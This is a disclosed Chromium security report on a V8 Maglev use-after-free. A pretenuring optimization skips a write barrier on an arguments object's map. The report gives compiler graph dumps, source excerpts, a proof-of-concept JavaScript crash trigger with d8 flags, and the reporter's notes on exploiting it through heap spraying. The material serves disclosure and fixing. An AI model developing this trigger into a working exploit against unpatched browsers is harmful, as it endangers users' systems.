# The maglev-pretenure-store-values feature leads to bypass of write barrier check

| Field | Value |
|-------|-------|
| **Issue ID** | [400584607](https://issues.chromium.org/issues/400584607) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>GarbageCollection |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ol...@chromium.org |
| **Created** | 2025-03-04 |
| **Bounty** | $10,000.00 |

## Description

---

VULNERABILITY DETAILS

This vulnerability is essentially a UAF issue caused by the absence of a write barrier. I have reported similar issues before, and subsequently V8 uniformly used `CanElideWriteBarrier()` to check whether the write barrier can be eliminated. However, the recently added `maglev-pretenure-store-values` has led to a bypass of this check, reintroducing the problem of missing write barriers.

Also, I noticed that this feature is being rolled back, changing from default on to default off. I hope I'm not too late.

The vulnerability occurs during the process of maglev graph building. The key points of the vulnerability lie in `const args = arguments;` and `const obj = {"f": args};`. The corresponding Maglev Graph for this part of the code is as follows:

```
  Block b2
    // const args = arguments
    7: ArgumentsLength → (x), 1 uses
    8: UnsafeSmiTagInt32 [n7:(x)] → (x), 2 uses
    9: 🐢 ArgumentsElements [n8:(x)] → (x), 1 uses
   11: AllocationBlock(Old) → (x), 1 uses
   12: InlinedAllocation(object 0x0a31005ce989 <Map[20](PACKED_ELEMENTS)>) [n11:(x)] → (x), 11 uses (8 non escaping uses)
   13: StoreMap(0x0a31005ce989 <Map[20](PACKED_ELEMENTS)>, InitializingYoung) [n12:(x)]    // map
   14: StoreTaggedFieldNoWriteBarrier(0x4) [n12:(x), n10:(x)]    // properties: Empty FixedArray
   15: StoreTaggedFieldWithWriteBarrier(0x8) [n12:(x), n9:(x)]    // elements: arguements elements
   16: StoreTaggedFieldNoWriteBarrier(0xc) [n12:(x), n8:(x)]    // length
   17: StoreTaggedFieldWithWriteBarrier(0x10) [n12:(x), n2:(x)]    // callee

    // const obj = {"f": args}
   20: AllocationBlock(Old) → (x), 1 uses
   21: InlinedAllocation(object 0x0a31005d9865 <Map[16](HOLEY_ELEMENTS)>) [n20:(x)] → (x), 5 uses (4 non escaping uses)
   22: StoreMap(0x0a31005d9865 <Map[16](HOLEY_ELEMENTS)>, Initializing) [n21:(x)]
   23: StoreTaggedFieldNoWriteBarrier(0x4) [n21:(x), n10:(x)]    // properties
   24: StoreTaggedFieldNoWriteBarrier(0x8) [n21:(x), n10:(x)]    // elements
   25: StoreTaggedFieldNoWriteBarrier(0xc) [n21:(x), n19:(x)]    // in_obj_prop0: Undefined
   26: StoreTaggedFieldWithWriteBarrier(0xc) [n21:(x), n12:(x)]    // write "f" property

```

The `maglev-pretenure-store-values` optimization occurs when generating the `26: StoreTaggedFieldWithWriteBarrier(0xc) [n21:(x), n12:(x)]` node. The relevant code is as follows:

```
// Build field write node
Node* MaglevGraphBuilder::BuildStoreTaggedField(ValueNode* object,
                                                ValueNode* value, int offset,
                                                StoreTaggedMode store_mode) {
  if (store_mode != StoreTaggedMode::kInitializing) {
    TryBuildStoreTaggedFieldToAllocation(object, value, offset);
  }
  if (CanElideWriteBarrier(object, value)) {    // Check if write barrier can be elided
    return AddNewNode<StoreTaggedFieldNoWriteBarrier>({object, value}, offset,
                                                      store_mode);
  } else {    // Write barrier cannot be elided
    // Detect if the store creates an old-to-new reference and pretenure the value
    if (v8_flags.maglev_pretenure_store_values) {
      if (auto alloc = object->TryCast<InlinedAllocation>()) {    // Get the node allocating the object
        if (alloc->allocation_block()->allocation_type() ==    // Object is allocated in Old Space
            AllocationType::kOld) {
          if (auto value_alloc = value->TryCast<InlinedAllocation>()) {    // Get the node allocating the value
            value_alloc->allocation_block()->Pretenure();    // Pretenure the allocation block of the value node
          }
        }
      }
    }
    return AddNewNode<StoreTaggedFieldWithWriteBarrier>({object, value}, offset,
                                                        store_mode);
  }
}

```

For the `n26` node:

- The `object` is the `n21` node, with `n21` memory allocated by the `20: AllocationBlock(Old)` node.
- The `value` is the `12: InlinedAllocation()` node, which allocates this object inside `opt_me()`.

Therefore, the `n26` node qualifies for the addition of `maglev_pretenure_store_values` optimization. It calls `value_alloc->allocation_block()->Pretenure()` to optimize `11: AllocationBlock(Young)` into `11: AllocationBlock(Old)`.

**When writing into an object that has just been allocated from the Young Space, a Write Barrier is not needed. However, when writing into an object allocated from the Old Space, a Write Barrier is required. Therefore, `maglev_pretenure_store_values` cannot simply transform `11: AllocationBlock(Young)` into `11: AllocationBlock(Old)`. This would break the optimization assumptions of other nodes and is no longer safe.**

Please note the `13: StoreMap()` node:

- Before `pretenure`: The `n11` node is `AllocationBlock(Young)`, so the property of `13: StoreMap()` is `InitializingYoung`.
- After `pretenure`, the `n11` node becomes `AllocationBlock(Old)`, but the property of `13: StoreMap()` remains `InitializingYoung`, even though the `n12` written into is not allocated from the `Young Space`.

```
   11: AllocationBlock(Old) → (x), 1 uses
   12: InlinedAllocation(object 0x0a31005ce989 <Map[20](PACKED_ELEMENTS)>) [n11:(x)] → (x), 11 uses (8 non escaping uses)
   13: StoreMap(0x0a31005ce989 <Map[20](PACKED_ELEMENTS)>, InitializingYoung) [n12:(x)]    // map


```

When subsequently generating instructions for `StoreMap`, `WriteBarrier` is not produced for `StoreMap` of the `kInitializingYoung` type.

```
void StoreMap::GenerateCode(MaglevAssembler* masm,
                            const ProcessingState& state) {
  MaglevAssembler::TemporaryRegisterScope temps(masm);
  // TODO(leszeks): Consider making this an arbitrary register and push/popping
  // in the deferred path.
  Register object = WriteBarrierDescriptor::ObjectRegister();
  Register value = temps.Acquire();
  __ MoveTagged(value, map_.object());

  if (kind() == Kind::kInitializingYoung) {    // <===
    __ StoreTaggedFieldNoWriteBarrier(object, HeapObject::kMapOffset, value);
  } else {
    __ StoreTaggedFieldWithWriteBarrier(object, HeapObject::kMapOffset, value,
                                        register_snapshot(),
                                        MaglevAssembler::kValueIsCompressed,
                                        MaglevAssembler::kValueCannotBeSmi);
  }
}

```

Because the `write barrier` is missing when writing to the `map` field of the `arguments` object, the GC does not know that the implicit class object `0x0a31005ce989` is still in use, and recycles `0x0a31005ce989`. This causes the `map` field of the `arguments` object to become a UAF pointer, and a crash occurs when `splice()` processes this field.

The root cause of the vulnerability lies in the `--maglev-pretenure-store-values` feature, which was introduced in commit `b2847928a045d781624504f446b4f3b511f8adb9`.

REPRODUCTION CASE

poc.js:

```
function opt_me() {
    const args = arguments;
    
    const obj = {"f": args};

    try { 
        opt_me(args, 1);
    } catch (e) {
        print("error");
    }
    
    const slice = Array.prototype.slice;
    slice.apply(args);
}

%PrepareFunctionForOptimization(opt_me);
opt_me();
%OptimizeMaglevOnNextCall(opt_me);
opt_me();

```

run as:

```
./d8 \
    --allow-natives-syntax \
    --stress-gc-during-compilation \
    --stress-incremental-marking \
    --predictable-gc-schedule \
    --predictable \
    --maglev-pretenure-store-values \
    ./poc.js

```

you will get crash like that:

```
#
# Fatal error in ../../src/objects/object-type.cc, line 82
# Type cast failed in CAST(LoadFromObject(machine_type, object, raw_offset)) at ../../src/codegen/code-stub-assembler.h:1166
  Expected Map but found 
#
#

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### cl...@appspot.gserviceaccount.com (2025-03-04)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5288128247955456.

### is...@chromium.org (2025-03-04)

Thank you for the report, assigning to the feature author.

### 24...@project.gserviceaccount.com (2025-03-04)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-03-04)

Detailed Report: https://clusterfuzz.com/testcase?key=5288128247955456

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  !MarkCompactCollector::IsOnEvacuationCandidate(heap_object) in evacuation-verifi
  v8::internal::EvacuationVerifier::VisitMapPointer
  v8::internal::VisitObject
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98977:98978

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5288128247955456

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### pg...@google.com (2025-03-04)

Clusterfuzz thinks this is a CHECK failure, but over to V8 sheriff to confirm!
Setting provisional sev (S1) for now

### hu...@gmail.com (2025-03-05)

Additional information:

1. This is a UAF vulnerability, so the data that the 'map' field of 'arguments' points to could be various, leading to different types of crashes.
2. I believe this vulnerability is exploitable. It's a UAF of a Map object. After triggering the vulnerability, spraying many other objects' Map can lead to type confusion. The main challenge in exploiting this vulnerability is the need for precise control over incremental GC. Heap Fengshui is a painful process, but it's not impossible. I have successfully exploited it in previous reports.

### ch...@google.com (2025-03-05)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-03-05)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### ch...@google.com (2025-03-05)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### is...@chromium.org (2025-03-05)

Removing SI-Head since `--maglev-pretenure-store-values` was enabled only in M135 and then it [was reverted](https://crrev.com/c/6309172).

### ol...@google.com (2025-03-10)

Thanks for the report. Can confirm, this is why we disabled the feature two weeks ago.

### 24...@project.gserviceaccount.com (2025-03-18)

ClusterFuzz testcase 5288128247955456 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=99287:99288

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### sp...@google.com (2025-03-26)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
high-quality report of memory corruption in a sandboxed process / renderer


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-03-26)

Congratulations 303f06e3! Thank you for your efforts and reporting this issue to us -- nice work!

### ch...@google.com (2025-06-25)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> high-quality report of memory corruption in a sandboxed process / renderer

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/400584607)*
